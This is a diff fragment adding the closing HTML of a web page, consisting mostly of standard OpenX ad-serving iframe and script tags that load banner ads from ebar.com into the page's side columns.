+	<iframe id='aae49eb5' name='aae49eb5' src='http://ebar.com/ads/www/delivery/afr.php?zoneid=11&amp;target=_blank&amp;cb=INSERT_RANDOM_NUMBER_HERE' framespacing='0' frameborder='no' scrolling='no' width='300' height='250'><a href='http://ebar.com/ads/www/delivery/ck.php?n=a06f68aa&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=11&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a06f68aa' border='0' alt='' /></a></iframe>
+
+</div>
+
+<div id="rightcol">
+	<!--/* OpenX Javascript Tag v2.8.1 */-->
+
+	<script type='text/javascript'><!--//<![CDATA[
+	   var m3_u = (location.protocol=='https:'?'https://ebar.com/ads/www/delivery/ajs.php':'http://ebar.com/ads/www/delivery/ajs.php');
+	   var m3_r = Math.floor(Math.random()*99999999999);
+	   if (!document.MAX_used) document.MAX_used = ',';
+	   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
+	   document.write ("?zoneid=13&amp;target=_blank&amp;block=1");
+	   document.write ('&amp;cb=' + m3_r);
+	   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
+	   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
+	   document.write ("&amp;loc=" + escape(window.location));
+	   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
+	   if (document.context) document.write ("&context=" + escape(document.context));
+	   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
+	   document.write ("'><\/scr"+"ipt>");
+	//]]>--></script><noscript><a href='http://ebar.com/ads/www/delivery/ck.php?n=a3ac09a5&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=13&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a3ac09a5' border='0' alt='' /></a></noscript>
+	<br />
+	<br />
+	<!--/* OpenX Javascript Tag v2.8.1 */-->
+
+	<script type='text/javascript'><!--//<![CDATA[
+	   var m3_u = (location.protocol=='https:'?'https://ebar.com/ads/www/delivery/ajs.php':'http://ebar.com/ads/www/delivery/ajs.php');
+	   var m3_r = Math.floor(Math.random()*99999999999);
+	   if (!document.MAX_used) document.MAX_used = ',';
+	   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
+	   document.write ("?zoneid=14&amp;target=_blank&amp;block=1");
+	   document.write ('&amp;cb=' + m3_r);
+	   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
+	   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
+	   document.write ("&amp;loc=" + escape(window.location));
+	   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
+	   if (document.context) document.write ("&context=" + escape(document.context));
+	   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
+	   document.write ("'><\/scr"+"ipt>");
+	//]]>--></script><noscript><a href='http://ebar.com/ads/www/delivery/ck.php?n=a1ad3981&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=14&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a1ad3981' border='0' alt='' /></a></noscript>
+	<br />
+	<br />
+	
+	
+<div class="banner">
+	<!--/* OpenX Javascript Tag v2.8.1 */-->
+
+	<script type='text/javascript'><!--//<![CDATA[
+	   var m3_u = (location.protocol=='https:'?'https://ebar.com/ads/www/delivery/ajs.php':'http://ebar.com/ads/www/delivery/ajs.php');
+	   var m3_r = Math.floor(Math.random()*99999999999);
+	   if (!document.MAX_used) document.MAX_used = ',';
+	   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
+	   document.write ("?zoneid=12&amp;target=_blank&amp;block=1");
+	   document.write ('&amp;cb=' + m3_r);
+	   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
+	   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
+	   document.write ("&amp;loc=" + escape(window.location));
+	   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
+	   if (document.context) document.write ("&context=" + escape(document.context));
+	   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
+	   document.write ("'><\/scr"+"ipt>");
+	//]]>--></script><noscript><a href='http://ebar.com/ads/www/delivery/ck.php?n=a72b4b6f&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=12&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a72b4b6f' border='0' alt='' /></a></noscript>
+</div>
+</div>
+<div id="leftcol">
+	<!--/* OpenX Javascript Tag v2.8.1 */-->
+
+	<script type='text/javascript'><!--//<![CDATA[
+	   var m3_u = (location.protocol=='https:'?'https://ebar.com/ads/www/delivery/ajs.php':'http://ebar.com/ads/www/delivery/ajs.php');
+	   var m3_r = Math.floor(Math.random()*99999999999);
+	   if (!document.MAX_used) document.MAX_used = ',';
+	   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
+	   document.write ("?zoneid=9&amp;block=1");
+	   document.write ('&amp;cb=' + m3_r);
+	   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
+	   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
+	   document.write ("&amp;loc=" + escape(window.location));
+	   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
+	   if (document.context) document.write ("&context=" + escape(document.context));
+	   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
+	   document.write ("'><\/scr"+"ipt>");
+	//]]>--></script><noscript><a href='http://ebar.com/ads/www/delivery/ck.php?n=a310c3c0&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=9&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a310c3c0' border='0' alt='' /></a></noscript>
+	<br />
+	<br />
+	
+	
+	<!--/* OpenX Javascript Tag v2.8.1 */-->
+
+	<script type='text/javascript'><!--//<![CDATA[
+	   var m3_u = (location.protocol=='https:'?'https://ebar.com/ads/www/delivery/ajs.php':'http://ebar.com/ads/www/delivery/ajs.php');
+	   var m3_r = Math.floor(Math.random()*99999999999);
+	   if (!document.MAX_used) document.MAX_used = ',';
+	   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
+	   document.write ("?zoneid=4&amp;block=1");
+	   document.write ('&amp;cb=' + m3_r);
+	   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
+	   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
+	   document.write ("&amp;loc=" + escape(window.location));
+	   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
+	   if (document.context) document.write ("&context=" + escape(document.context));
+	   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
+	   document.write ("'><\/scr"+"ipt>");
+	//]]>--></script><noscript><a href='http://ebar.com/ads/www/delivery/ck.php?n=a45d7b48&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=4&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a45d7b48' border='0' alt='' /></a></noscript>
+	<br />
+	<br />
+	
+		<div class="banner">
+		<!--/* OpenX Javascript Tag v2.8.1 */-->
+
+		<script type='text/javascript'><!--//<![CDATA[
+		   var m3_u = (location.protocol=='https:'?'https://ebar.com/ads/www/delivery/ajs.php':'http://ebar.com/ads/www/delivery/ajs.php');
+		   var m3_r = Math.floor(Math.random()*99999999999);
+		   if (!document.MAX_used) document.MAX_used = ',';
+		   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
+		   document.write ("?zoneid=6&amp;target=_blank&amp;block=1");
+		   document.write ('&amp;cb=' + m3_r);
+		   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
+		   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
+		   document.write ("&amp;loc=" + escape(window.location));
+		   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
+		   if (document.context) document.write ("&context=" + escape(document.context));
+		   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
+		   document.write ("'><\/scr"+"ipt>");
+		//]]>--></script><noscript><a href='http://ebar.com/ads/www/delivery/ck.php?n=aeffa601&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=6&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=aeffa601' border='0' alt='' /></a></noscript>
+
+
+</div>
+</div>
+
+</div>
+
+
+
+</body>
+</html>
